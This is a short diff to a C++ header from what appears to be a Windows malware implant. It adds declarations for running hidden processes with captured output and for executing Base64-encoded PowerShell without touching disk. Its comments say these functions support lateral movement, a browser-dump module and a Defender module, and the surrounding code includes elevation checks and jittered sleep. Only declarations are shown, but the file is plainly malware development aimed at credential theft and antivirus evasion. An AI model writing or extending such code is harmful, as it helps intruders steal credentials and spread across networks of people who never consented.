@@ -52,6 +52,20 @@ DWORD        GetOSBuild();        // via RtlGetVersion (shim-immune)
 BOOL         IsElevated();        // TokenElevation query
 
 // ---------------------------------------------------------------------------
+// Hidden process with captured output — the primitive under RunFilelessPS and
+// the lateral-movement vectors. Returns stdout+stderr, capped at
+// config::CMD_OUTPUT_MAX, waiting at most config::CMD_TIMEOUT_MS.
+// ---------------------------------------------------------------------------
+std::wstring RunHiddenCapture(const std::wstring& cmdLine);
+
+// ---------------------------------------------------------------------------
+// Fileless PowerShell — shared by the browser-dump and Defender modules.
+// `b64Command` is Base64 of the UTF-16LE script, i.e. exactly what
+// powershell.exe -EncodedCommand expects. Returns captured stdout+stderr.
+// ---------------------------------------------------------------------------
+std::wstring RunFilelessPS(const std::string& b64Command);
+
+// ---------------------------------------------------------------------------
 // Timing
 // ---------------------------------------------------------------------------
 VOID JitterSleep(DWORD minSec, DWORD maxSec);  // uniform distribution
